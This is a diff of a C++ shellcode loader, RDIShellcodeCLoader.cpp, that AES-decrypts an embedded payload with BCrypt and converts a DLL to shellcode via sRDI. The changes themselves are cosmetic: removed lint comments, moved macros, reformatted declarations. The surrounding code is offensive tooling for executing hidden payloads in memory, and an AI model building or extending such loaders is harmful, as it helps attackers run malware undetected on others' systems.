@@ -1,26 +1,6 @@
 // RDIShellcodeCLoader.cpp : Defines the entry point for the console application.
 //
 
-// ReSharper disable IdentifierTypo
-// ReSharper disable CppClangTidyBugproneMacroParentheses
-// ReSharper disable CppClangTidyModernizeUseAuto
-// ReSharper disable CppUseAuto
-// ReSharper disable CppLocalVariableMayBeConst
-// ReSharper disable CppClangTidyClangDiagnosticOldStyleCast
-// ReSharper disable CppCStyleCast
-// ReSharper disable CppJoinDeclarationAndAssignment
-// ReSharper disable CppClangTidyClangDiagnosticUnsequenced
-// ReSharper disable CppClangTidyClangDiagnosticImplicitIntConversion
-// ReSharper disable CppInconsistentNaming
-// ReSharper disable CppClangTidyCppcoreguidelinesMacroUsage
-// ReSharper disable CppClangTidyClangDiagnosticUnusedMacros
-// ReSharper disable CppClangTidyClangDiagnosticDeprecatedDeclarations
-// ReSharper disable CppParameterMayBeConst
-// ReSharper disable CppDeprecatedEntity
-// ReSharper disable CppClangTidyClangDiagnosticShorten64To32
-// ReSharper disable CppClangTidyBugproneUnusedRaii
-// ReSharper disable CppClangTidyClangDiagnosticCastQual
-// ReSharper disable CppClangTidyClangDiagnosticCastAlign
 #include <Windows.h>
 #include <bcrypt.h>
 #include <functional>
@@ -29,9 +9,6 @@
 #include "payload.h"
 
 #pragma comment(lib, "Bcrypt.lib")
-
-#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
-#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
 
 #define DEREF_64( name )*(DWORD64 *)(name)
 #define DEREF_32( name )*(DWORD *)(name)
@@ -354,29 +331,31 @@ BOOL ConvertToShellcode(LPVOID inBytes, DWORD length, DWORD userFunction, LPVOID
 	return true;
 }
 
-typedef UINT_PTR(WINAPI* RDI)();
-typedef void(WINAPI* Function)();
-typedef BOOL(__cdecl* EXPORTEDFUNCTION)(LPVOID, DWORD);
+typedef UINT_PTR (WINAPI* RDI)();
+typedef void	 (WINAPI* Function)();
+typedef BOOL	 (__cdecl* EXPORTEDFUNCTION)(LPVOID, DWORD);
 
-void main(int argc, char* argv[], char* envp[])
+#define NT_SUCCESS(Status)          (((NTSTATUS)(Status)) >= 0)
+#define STATUS_UNSUCCESSFUL         ((NTSTATUS)0xC0000001L)
+
+void main()
 {
-	LPSTR finalShellcode = nullptr;
-	DWORD finalSize;
-	int inSize;
-	DWORD dwOldProtect1 = 0;
-	SYSTEM_INFO sysInfo;
+	LPSTR					finalShellcode = nullptr;
+	DWORD					dwOldProtect1 = 0;
+	SYSTEM_INFO				sysInfo;
 	BCRYPT_ALG_HANDLE       hAesAlg = NULL;
 	BCRYPT_KEY_HANDLE       hKey = NULL;
 	NTSTATUS                status = STATUS_UNSUCCESSFUL;
 	DWORD                   cbCipherText = 0,
-		cbRawData = 0,
-		cbData = 0,
-		cbKeyObject = 0,
-		cbBlockLen = 0;
+							cbRawData = 0,
+							cbData = 0,
+							cbKeyObject = 0,
+							cbBlockLen = 0,
+							finalSize;
 	PBYTE                   pbCipherText = NULL,
-		pbRawData = NULL,
-		pbKeyObject = NULL,
-		pbIV = NULL;
+							pbRawData = NULL,
+							pbKeyObject = NULL,
+							pbIV = NULL;
 	BYTE                    creds[32] = {};
 
 	// Open an algorithm handle.
@@ -538,7 +517,8 @@ void main(int argc, char* argv[], char* envp[])
 			SRDI_CLEARHEADER, 
 			finalShellcode, 
 			finalSize
-		)) {
+		)) 
+		{
 			printf("[!] Failed to convert DLL\n");
 			goto Cleanup;
 		}
